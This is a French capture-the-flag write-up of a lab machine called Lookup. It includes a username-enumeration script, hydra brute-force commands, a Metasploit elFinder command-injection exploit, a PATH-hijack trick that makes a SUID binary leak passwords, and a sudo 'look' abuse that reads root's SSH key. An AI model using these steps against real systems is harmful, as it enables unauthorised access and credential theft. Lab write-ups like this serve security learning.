
- **IP**:
```
10.10.71.32
```

- **scan nmap**:
![[Lookup/files/nmap.png]]

- http://lookup.thm
![[Lookup/files/web.png]]

Nous avons là une simple page de login. L'énumération des répertoires n'a rien donné, `admin:admin` et les mdp classiques ne marchent pas non plus. Voici donc un script qui permet d'énumérer les **usernames** valide:
```
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/wordlists/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```

Lorsequ'on exécute le script, on obient:

![[valide_username.png]]

Maintenant nous allons faire un brute force pour avoir le mot de passe de **jose**:

```
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

![[hydra_on_jose.png]]
Lorsque qu'on se connecte avec ces infos, on est redirigé vers une URL qu'on ne peut pas accéder

![[redirection_error.png]]

On doit donc ajouter `files.lookup.htm` dans `/etc/hosts`

![[elFinder.png]]

Cela ressemble à un gestionnaire de fichier pour les sites web. Maintenant il faut connaitre sa version:

![[elFinder_version.png]]

Nous allons faire un **searchsploit** pour voir les CVE sur cette version:

```
searchsploit elfinder
```

![[exploit_elFinder.png]]
Cette version est vulnérable à: **'PHP connector' Command Injection** . Nous allons ouvrir **msfconsole** pour lancer un exploit:

```
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Puis ajouter l'IP de la cible en tant que **RHOST** et l'IP de l'attaquant en tant que **LHOST**

![[rhost_lhost.png]]

Là nous obtenons un shell

![[shell1.png]]

On peut voir la liste des utilisateurs avec la commande:

```
cat /etc/passwd | grep sh$
```

![[userlist.png]]
On a donc 2 users: **root** et **think**. Pour avoir la liste des mdp possible pour **think**:

```
echo '#!/bin/bash' > /tmp/id  
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id  
chmod +x /tmp/id  
export PATH=/tmp:$PATH  
/usr/sbin/pwm
```

![[mdpForThink.png]]

Nous allons copié la liste dans un fichier txt et utilisé ce fichier pour bruteforcer le mdp de **think**

```
hydra -l think -P password.txt  -t 4 ssh://10.10.71.32
```

![[hydra_on_jose.png]]

Maintenant on peut avoir un shell avec ssh et obtenir l'user flag:

![[Lookup/files/userflag.png]]

Maintenant nous allons voir ce qu'on peut exécuter avec les privilèges **sudo** avec `sudo -l`

![[canExecuteWithSudo.png]]
Là, ça nous dit qu'on peut exécuter **look**

![[look.png]]

![[sshkey.png]]

Grâce à ça on a obtenu un clé ssh pour se connecter à l'user **root**. Il faut copier cette clé dans un fichier.

```
ssh -i cle_ssh-root root@10.10.71.32
```

![[Lookup/files/rootflag.png]]



